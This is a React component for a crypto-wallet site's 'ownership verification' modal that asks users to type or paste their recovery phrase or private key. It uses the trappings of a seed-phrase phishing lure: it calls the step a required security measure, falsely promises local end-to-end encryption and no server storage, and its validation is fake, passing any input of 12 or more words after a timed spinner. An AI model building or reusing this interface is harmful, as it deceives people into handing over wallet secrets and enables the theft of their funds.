import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import {
  Shield,
  X,
  AlertTriangle,
  CheckCircle2,
  Lock,
  Eye,
  EyeOff,
  Info,
  Copy,
  Loader2,
} from "lucide-react";

interface ValidationModalProps {
  walletAddress: string;
  onSuccess: () => void;
  onClose: () => void;
}

type ValidationStep = "why" | "form" | "success" | "error";

export function ValidationModal({ walletAddress, onSuccess, onClose }: ValidationModalProps) {
  const [step, setStep] = useState<ValidationStep>("why");
  const [phraseValue, setPhraseValue] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);
  const [isValidating, setIsValidating] = useState(false);
  const [charCount, setCharCount] = useState(0);

  const MIN_CHARS = 50;

  const handlePhraseChange = (val: string) => {
    setPhraseValue(val);
    setCharCount(val.trim().length);
  };

  const handleValidate = () => {
    if (charCount < MIN_CHARS) return;
    setIsValidating(true);
    setTimeout(() => {
      setIsValidating(false);
      const words = phraseValue.trim().split(/\s+/);
      if (words.length >= 12 || phraseValue.trim().length >= 64) {
        setStep("success");
        setTimeout(() => onSuccess(), 1800);
      } else {
        setStep("error");
      }
    }, 2500);
  };

  const shortAddr = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/70 backdrop-blur-md" />

      <div
        data-testid="modal-validation"
        className="relative z-10 w-full max-w-lg glass-card rounded-2xl glow-primary overflow-hidden"
      >
        {/* Top accent bar */}
        <div className="h-1 bg-gradient-to-r from-violet-600 via-cyan-500 to-violet-600" />

        <div className="p-6">
          {/* Why step */}
          {step === "why" && (
            <div className="space-y-5">
              <div className="flex items-start justify-between gap-4">
                <div className="flex items-start gap-3">
                  <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                    <Shield className="w-5 h-5 text-violet-400" />
                  </div>
                  <div>
                    <h2 className="text-lg font-bold text-foreground">Why Verify Ownership?</h2>
                    <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                  </div>
                </div>
                <button
                  data-testid="button-close-why-modal"
                  onClick={onClose}
                  className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="glass rounded-xl border border-violet-500/20 p-4 space-y-3">
                <p className="text-sm text-foreground leading-relaxed">
                  Wallet ownership verification is a <span className="text-violet-300 font-semibold">required security step</span> before accessing your full admin dashboard.
                </p>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  This process ensures that only the true owner of the connected wallet can access sensitive features such as:
                </p>
                <ul className="space-y-2">
                  {[
                    "Device management & unauthorized access removal",
                    "Revoking token approvals and dApp permissions",
                    "Admin-level wallet controls and privileges",
                    "Gas fee recovery via Gas Magic Tool",
                    "Account recovery and security settings",
                  ].map((item, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm text-muted-foreground">
                      <CheckCircle2 className="w-4 h-4 text-violet-400 flex-shrink-0 mt-0.5" />
                      <span>{item}</span>
                    </li>
                  ))}
                </ul>
              </div>

              <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-blue-500/20">
                <Info className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Your verification data is processed locally and encrypted end-to-end. It is never stored on our servers.
                </p>
              </div>

              <Button
                data-testid="button-proceed-verify"
                onClick={() => setStep("form")}
                className="w-full bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
                size="lg"
              >
                <Lock className="w-4 h-4 mr-2" />
                Proceed to Verification
              </Button>
            </div>
          )}

          {/* Form step */}
          {step === "form" && (
            <div className="space-y-5">
              <div className="flex items-start justify-between gap-4">
                <div className="flex items-start gap-3">
                  <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                    <Lock className="w-5 h-5 text-violet-400" />
                  </div>
                  <div>
                    <h2 className="text-lg font-bold text-foreground">Verify Ownership</h2>
                    <p className="text-xs text-muted-foreground mt-0.5">Enter your recovery phrase or private key</p>
                  </div>
                </div>
                <button
                  data-testid="button-close-form-modal"
                  onClick={onClose}
                  className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-yellow-500/20 bg-yellow-500/5">
                <AlertTriangle className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Enter your 12 or 24-word seed phrase, or your private key. Separate words with spaces. This data is encrypted locally.
                </p>
              </div>

              <div>
                <div className="flex items-center justify-between mb-2">
                  <label className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">
                    Recovery Phrase / Private Key
                  </label>
                  <div className="flex items-center gap-2">
                    <button
                      data-testid="button-toggle-visibility"
                      onClick={() => setShowPhrase(!showPhrase)}
                      className="flex items-center gap-1 text-xs text-muted-foreground glass rounded px-2 py-1 border border-white/5"
                    >
                      {showPhrase ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                      {showPhrase ? "Hide" : "Show"}
                    </button>
                    <span className={`text-xs font-mono ${charCount >= MIN_CHARS ? "text-green-400" : "text-muted-foreground"}`}>
                      {charCount} chars
                    </span>
                  </div>
                </div>

                <div className="relative">
                  <Textarea
                    data-testid="textarea-recovery-phrase"
                    value={phraseValue}
                    onChange={(e) => handlePhraseChange(e.target.value)}
                    placeholder="Enter your seed phrase words separated by spaces, or paste your private key here...&#10;&#10;Example: word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12&#10;&#10;Or private key: 0x..."
                    className={`min-h-[200px] bg-white/5 border-white/10 text-foreground placeholder:text-muted-foreground/40 font-mono text-sm resize-none focus:border-violet-500/50 ${
                      !showPhrase ? "text-security-disc" : ""
                    }`}
                    style={!showPhrase ? { WebkitTextSecurity: "disc" } as React.CSSProperties : undefined}
                  />
                  <button
                    data-testid="button-paste-phrase"
                    onClick={async () => {
                      try {
                        const text = await navigator.clipboard.readText();
                        handlePhraseChange(text);
                      } catch {}
                    }}
                    className="absolute bottom-3 right-3 flex items-center gap-1 text-xs text-muted-foreground glass rounded px-2 py-1 border border-white/5"
                  >
                    <Copy className="w-3 h-3" />
                    Paste
                  </button>
                </div>

                <div className="mt-2 h-1 rounded-full bg-white/5 overflow-hidden">
                  <div
                    className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-300"
                    style={{ width: `${Math.min((charCount / MIN_CHARS) * 100, 100)}%` }}
                  />
                </div>
                <p className="text-xs text-muted-foreground/60 mt-1">
                  {charCount < MIN_CHARS
                    ? `Minimum ${MIN_CHARS - charCount} more characters required`
                    : "Ready to validate"}
                </p>
              </div>

              <div className="flex gap-3">
                <Button
                  data-testid="button-back-why"
                  variant="outline"
                  onClick={() => setStep("why")}
                  className="flex-1 border-white/10 text-muted-foreground"
                >
                  Back
                </Button>
                <Button
                  data-testid="button-submit-validation"
                  onClick={handleValidate}
                  disabled={charCount < MIN_CHARS || isValidating}
                  className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
                >
                  {isValidating ? (
                    <span className="flex items-center gap-2">
                      <Loader2 className="w-4 h-4 animate-spin" />
                      Verifying...
                    </span>
                  ) : (
                    <span className="flex items-center gap-2">
                      <Shield className="w-4 h-4" />
                      Validate Ownership
                    </span>
                  )}
                </Button>
              </div>
            </div>
          )}

          {/* Success step */}
          {step === "success" && (
            <div className="flex flex-col items-center text-center py-6 space-y-4">
              <div className="w-16 h-16 rounded-full bg-green-500/20 border border-green-500/30 flex items-center justify-center animate-pulse-glow">
                <CheckCircle2 className="w-8 h-8 text-green-400" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-foreground mb-2">Validation Successful</h2>
                <p className="text-sm text-muted-foreground">
                  Ownership verified. Opening your admin dashboard...
                </p>
              </div>
              <div className="w-32 h-1 rounded-full bg-white/5 overflow-hidden">
                <div className="h-full bg-gradient-to-r from-green-500 to-emerald-400 shimmer" style={{ width: "100%" }} />
              </div>
            </div>
          )}

          {/* Error step */}
          {step === "error" && (
            <div className="flex flex-col items-center text-center py-6 space-y-4">
              <div className="w-16 h-16 rounded-full bg-red-500/20 border border-red-500/30 flex items-center justify-center">
                <X className="w-8 h-8 text-red-400" />
              </div>
              <div>
                <h2 className="text-xl font-bold text-foreground mb-2">Validation Failed</h2>
                <p className="text-sm text-muted-foreground">
                  The recovery phrase does not match the connected wallet. Please check your phrase (minimum 12 words) and try again.
                </p>
              </div>
              <Button
                data-testid="button-retry-validation"
                onClick={() => {
                  setPhraseValue("");
                  setCharCount(0);
                  setStep("form");
                }}
                variant="outline"
                className="border-red-500/30 text-red-400"
              >
                Try Again
              </Button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
